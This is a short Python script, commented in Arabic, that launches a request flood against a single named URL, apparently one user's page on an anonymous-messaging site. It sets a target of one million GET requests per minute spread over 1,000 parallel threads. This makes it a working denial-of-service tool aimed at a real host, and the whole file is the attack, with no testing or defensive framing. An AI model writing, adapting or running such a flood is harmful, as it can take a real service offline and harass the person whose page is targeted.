import requests
import concurrent.futures
import time

def send_request(url):
    try:
        response = requests.get(url)
        print(f"Request to {url} Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Request to {url} failed: {e}")

# إعداد الرابط الأساسي
base_url = "https://sarhne.sarahah.pro/marym23"

# العدد الإجمالي للطلبات المراد إرسالها في الدقيقة
total_requests_per_minute = 1000000
# عدد مؤشرات الاتصال المتوازية
max_threads = 1000

# قياس الوقت المستغرق
start_time = time.time()

# عدد الطلبات المراد إرسالها في كل دورة بناءً على عدد مؤشرات الاتصال
requests_per_cycle = total_requests_per_minute // max_threads

# عدد الدورات المراد تنفيذها في الدقيقة لتحقيق العدد المطلوب من الطلبات
cycles_per_minute = total_requests_per_minute // requests_per_cycle

# تنفيذ الطلبات
for _ in range(cycles_per_minute):
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        urls_to_request = [base_url] * requests_per_cycle
        executor.map(send_request, urls_to_request)
        time.sleep(60 / cycles_per_minute)

end_time = time.time()
print(f"Total time taken: {end_time - start_time} seconds")
